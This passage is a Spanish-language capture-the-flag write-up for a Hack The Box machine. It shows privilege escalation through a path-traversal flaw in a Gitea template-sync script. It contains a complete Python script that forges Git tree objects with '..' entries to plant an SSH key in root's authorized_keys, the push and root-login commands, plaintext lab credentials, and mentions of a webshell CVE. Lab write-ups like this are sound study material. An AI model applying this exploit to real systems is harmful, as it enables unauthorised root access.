+Aprovechamiento de una vulnerabilidad de <em>Directory Traversal</em> en el script de sincronización de plantillas de Gitea (<code>/etc/gitea/template-sync.py</code>). El atacante crea un repositorio Git configurado como “template” y utiliza un script de Python (<code>build.py</code>) para manipular manualmente los objetos Git, inyectando secuencias de recorrido de directorios (<code>..</code>) que permiten escribir archivos fuera del directorio de despliegue. Al inyectar una clave pública SSH en <code>/root/.ssh/authorized_keys</code> mediante la ejecución automatizada del servicio <code>gitea-template-sync.timer</code>, se obtiene acceso SSH con privilegios de root.</p>
+<h3 id="el-concepto-inyección-de-ruta-path-traversal">El Concepto: Inyección de Ruta (Path Traversal)</h3>
+<p>El script <code>template-sync.py</code> clona repositorios Git y coloca sus archivos en una ruta de destino usando <code>os.path.join(base, archivo)</code>. Si <code>archivo</code> es <code>../../../root/.ssh/authorized_keys</code>, la función de Python resuelve los puntos y permite escribir en directorios fuera de la carpeta de staging.</p>
+<h3 id="paso-a-paso">Paso a Paso</h3>
+<h3 id="1-acceso-al-gitea-y-creación-del-repositorio">1. Acceso al Gitea y creación del Repositorio</h3>
+<p>Tras iniciar sesión en <code>http://git.nexus.htb/</code> con las credenciales de <code>jones</code> obtenidas anteriormente:</p>
+<ul>
+<li>
+<p><strong>Crear Repositorio:</strong> Haz clic en el botón <code>+</code> (o “New Repository”).</p>
+</li>
+<li>
+<p><strong>Configuración:</strong> * Nombre del repositorio: <code>rce</code>.</p>
+<ul>
+<li>
+<p>Marcado como <strong>Template</strong>: Debes activar la casilla “Make repository a template”. Esto es vital para que el script de sincronización procese el repositorio.</p>
+</li>
+<li>
+<p>Inicializar repositorio: Selecciona “Initialize Repository” (aunque esto puede variar, el objetivo es tener un repositorio base).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Crear:</strong> Finaliza haciendo clic en “Create Repository”.</p>
+</li>
+</ul>
+<h3 id="2-clonación-y-preparación-local">2. Clonación y preparación local</h3>
+<p>Ahora debes manipular el repositorio localmente para insertar los objetos con los caracteres de recorrido (<code>..</code>) que el script <code>build.py</code> procesará.</p>
+<ul>
+<li>
+<p><strong>Clonar el repositorio:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">cd</span><span style="color:#F1FA8C"> /tmp</span></span>
+<span class="line"><span style="color:#50FA7B">git</span><span style="color:#F1FA8C"> clone</span><span style="color:#F1FA8C"> http://jones:</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">y27xb3ha!!74GbR</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">@git.nexus.htb/jones/rce.git</span></span>
+<span class="line"><span style="color:#8BE9FD">cd</span><span style="color:#F1FA8C"> rce</span></span>
+<span class="line"><span style="color:#50FA7B">touch</span><span style="color:#F1FA8C"> README.md</span></span></code></pre>
+</li>
+<li>
+<p><strong>Preparar el entorno:</strong> Asegúrate de que el script <code>build.py</code> esté en la ruta correcta y que el archivo de clave pública <code>/tmp/.k.pub</code> exista.</p>
+</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#6272A4">#!/usr/bin/env python3</span></span>
+<span class="line"><span style="color:#FF79C6">import</span><span style="color:#F8F8F2"> hashlib, zlib, os, subprocess, sys, time</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">def</span><span style="color:#50FA7B"> write_obj</span><span style="color:#F8F8F2">(</span><span style="color:#FFB86C;font-style:italic">data</span><span style="color:#F8F8F2">, </span><span style="color:#FFB86C;font-style:italic">t</span><span style="color:#F8F8F2">):</span></span>
+<span class="line"><span style="color:#F8F8F2">    h </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> (</span><span style="color:#E9F284">"</span><span style="color:#BD93F9">%s</span><span style="color:#BD93F9"> %d</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> %</span><span style="color:#F8F8F2"> (t, </span><span style="color:#8BE9FD">len</span><span style="color:#F8F8F2">(data))).encode() </span><span style="color:#FF79C6">+</span><span style="color:#FF79C6"> b</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\x00</span><span style="color:#E9F284">"</span></span>
+<span class="line"><span style="color:#F8F8F2">    s </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> h </span><span style="color:#FF79C6">+</span><span style="color:#F8F8F2"> data</span></span>
+<span class="line"><span style="color:#F8F8F2">    sha </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> hashlib.sha1(s).hexdigest()</span></span>
+<span class="line"><span style="color:#F8F8F2">    d </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> os.path.join(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">.git</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">objects</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, sha[</span><span style="color:#FF79C6">:</span><span style="color:#BD93F9">2</span><span style="color:#F8F8F2">])</span></span>
+<span class="line"><span style="color:#F8F8F2">    os.makedirs(d, </span><span style="color:#FFB86C;font-style:italic">exist_ok</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">True</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">    p </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> os.path.join(d, sha[</span><span style="color:#BD93F9">2</span><span style="color:#FF79C6">:</span><span style="color:#F8F8F2">])</span></span>
+<span class="line"><span style="color:#FF79C6">    if</span><span style="color:#FF79C6"> not</span><span style="color:#F8F8F2"> os.path.exists(p):</span></span>
+<span class="line"><span style="color:#8BE9FD">        open</span><span style="color:#F8F8F2">(p, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">wb</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">).write(zlib.compress(s))</span></span>
+<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#F8F8F2"> sha</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">def</span><span style="color:#50FA7B"> entry</span><span style="color:#F8F8F2">(</span><span style="color:#FFB86C;font-style:italic">mode</span><span style="color:#F8F8F2">, </span><span style="color:#FFB86C;font-style:italic">name</span><span style="color:#F8F8F2">, </span><span style="color:#FFB86C;font-style:italic">sha</span><span style="color:#F8F8F2">):</span></span>
+<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#F8F8F2"> (</span><span style="color:#E9F284">"</span><span style="color:#BD93F9">%s</span><span style="color:#BD93F9"> %s</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> %</span><span style="color:#F8F8F2"> (mode, name)).encode() </span><span style="color:#FF79C6">+</span><span style="color:#FF79C6"> b</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\x00</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> +</span><span style="color:#8BE9FD;font-style:italic"> bytes</span><span style="color:#F8F8F2">.fromhex(sha)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">if</span><span style="color:#FF79C6"> not</span><span style="color:#F8F8F2"> os.path.isdir(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">.git</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">):</span></span>
+<span class="line"><span style="color:#8BE9FD">    print</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Run inside git repo</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">    sys.exit(</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">r </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> subprocess.run([</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">cat</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/tmp/.k.pub</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">], </span><span style="color:#FFB86C;font-style:italic">capture_output</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">True</span><span style="color:#F8F8F2">, </span><span style="color:#FFB86C;font-style:italic">text</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">True</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> r.returncode </span><span style="color:#FF79C6">!=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">:</span></span>
+<span class="line"><span style="color:#8BE9FD">    print</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">ssh-keygen -t ed25519 -f /tmp/.k -N ''</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">    sys.exit(</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">key </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> r.stdout.strip() </span><span style="color:#FF79C6">+</span><span style="color:#E9F284"> "</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span></span>
+<span class="line"><span style="color:#F8F8F2">blob </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(key.encode(), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">blob</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">readme </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(</span><span style="color:#FF79C6">b</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"># Template</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">blob</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">ssh_t </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(entry(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">100644</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">authorized_keys</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, blob), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">tree</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">cur </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(entry(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">40000</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">.ssh</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, ssh_t), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">tree</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">fir </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(entry(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">40000</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">root</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, cur), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">tree</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">for</span><span style="color:#F8F8F2"> i </span><span style="color:#FF79C6">in</span><span style="color:#8BE9FD"> range</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">4</span><span style="color:#F8F8F2">):</span></span>
+<span class="line"><span style="color:#F8F8F2">    fir </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(entry(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">40000</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">..</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, fir), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">tree</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">root </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(entry(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">100644</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">README.md</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, readme) </span><span style="color:#FF79C6">+</span><span style="color:#F8F8F2"> entry(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">40000</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">..</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, fir), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">tree</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F8F8F2">ts </span><span style="color:#FF79C6">=</span><span style="color:#8BE9FD;font-style:italic"> int</span><span style="color:#F8F8F2">(time.time())</span></span>
+<span class="line"><span style="color:#F8F8F2">c </span><span style="color:#FF79C6">=</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">tree </span><span style="color:#BD93F9">%s</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">author x &#x3C;x@x> </span><span style="color:#BD93F9">%d</span><span style="color:#F1FA8C"> +0000</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">committer x &#x3C;x@x> </span><span style="color:#BD93F9">%d</span><span style="color:#F1FA8C"> +0000</span><span style="color:#FF79C6">\n\n</span><span style="color:#F1FA8C">init</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> %</span><span style="color:#F8F8F2"> (root, ts, ts)</span></span>
+<span class="line"><span style="color:#F8F8F2">sha </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> write_obj(c.encode(), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">commit</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">os.makedirs(os.path.join(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">.git</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">refs</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">heads</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">), </span><span style="color:#FFB86C;font-style:italic">exist_ok</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">True</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#8BE9FD">open</span><span style="color:#F8F8F2">(os.path.join(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">.git</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">refs</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">heads</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">main</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">), </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">w</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">).write(sha </span><span style="color:#FF79C6">+</span><span style="color:#E9F284"> "</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#8BE9FD">print</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Done: </span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> +</span><span style="color:#F8F8F2"> sha)</span></span></code></pre>
+<h3 id="3-ejecución-del-payload-y-sincronización">3. Ejecución del payload y sincronización</h3>
+<p>El script <code>build.py</code> crea la estructura de objetos Git “a mano”, evitando las protecciones normales de <code>git</code>.</p>
+<ul>
+<li>
+<p><strong>Ejecución:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> /tmp/build.py</span></span>
+<span class="line"><span style="color:#6272A4"># El script mostrará: Done: 025b473292e1fdcdb027771defd8d3d0279c709f [cite: 456]</span></span></code></pre>
+</li>
+<li>
+<p><strong>Subida forzada:</strong> Como has modificado la estructura de objetos directamente en <code>.git/objects/</code>, debes forzar el push:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">git</span><span style="color:#F1FA8C"> push</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> origin</span><span style="color:#F1FA8C"> main</span><span style="color:#BD93F9"> --force</span></span></code></pre>
+</li>
+</ul>
+<h3 id="4-espera-y-validación">4. Espera y validación</h3>
+<p>Una vez hecho el push, el servicio <code>gitea-template-sync.service</code> se activará automáticamente mediante su temporizador de 2 minutos.</p>
+<ul>
+<li>
+<p><strong>Verificación:</strong> Monitorea el log para confirmar que el servicio “sincronizó” la ruta maliciosa hacia <code>/root/.ssh/authorized_keys</code>:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> /var/log/template-sync.log</span></span></code></pre>
+</li>
+<li>
+<p><strong>Acceso:</strong> Si el log indica <code>synced: ../////root/.ssh/authorized_keys</code>, ya puedes acceder como root:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ssh</span><span style="color:#BD93F9"> -i</span><span style="color:#F1FA8C"> /tmp/.k</span><span style="color:#F1FA8C"> root@nexus.htb</span></span></code></pre>
+</li>
+</ul>
+<h3 id="resumen-de-la-falla-técnica">Resumen de la falla técnica</h3>
+<p>El error crítico no es de Gitea en sí, sino de la <strong>falta de saneamiento</strong> en <code>template-sync.py</code>. Al tratar los nombres de los archivos dentro del repositorio como rutas de confianza, el programador permitió que cualquier usuario que pueda crear un repositorio controle dónde el servicio escribe archivos en el sistema. Al ejecutarse esto como un servicio del sistema, cualquier escritura se realiza con privilegios de <code>root</code>.</p>
+<h2 id="6-️-notas-técnicas-y-herramientas">6. 🛠️ Notas Técnicas y Herramientas</h2>
+<h3 id="resumen-de-credenciales">Resumen de Credenciales</h3>
+<ul>
+<li>
+<p><strong>Usuario <code>jones</code> (SSH):</strong> <code>jones</code> : <code>y27xb3ha!!74GbR</code> (obtenidas del archivo <code>.env</code> en el repositorio Gitea <code>krayin-docker-setup</code>).</p>
+</li>
+<li>
+<p><strong>Base de Datos Krayin:</strong> <code>krayin</code> : <code>y27xb3ha!!74GbR</code> (mismas credenciales encontradas en el archivo <code>.env</code>).</p>
+</li>
+</ul>
+<h3 id="referencias">Referencias</h3>
+<ul>
+<li>
+<ul>
+<li>
+<p><strong>CVE-2026-38526:</strong> Vulnerabilidad en Krayin CRM (v2.2.0) utilizada para la carga de una webshell PHP y obtención de shell inicial (<code>www-data</code>).</p>
+<ul>
+<li><strong>Herramientas:</strong> <code>nmap</code> (enumeración de puertos), <code>ffuf</code> (fuzzing de subdominios), <code>Burp Suite</code> (intercepción de peticiones), <code>Netcat</code> (listener para reverse shell), <code>git</code>, <code>ssh-keygen</code>, y scripts personalizados en Python para la creación de objetos Git maliciosos.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul> </div> <!-- FOOTER DEL ARTÍCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de writeups
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2026 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
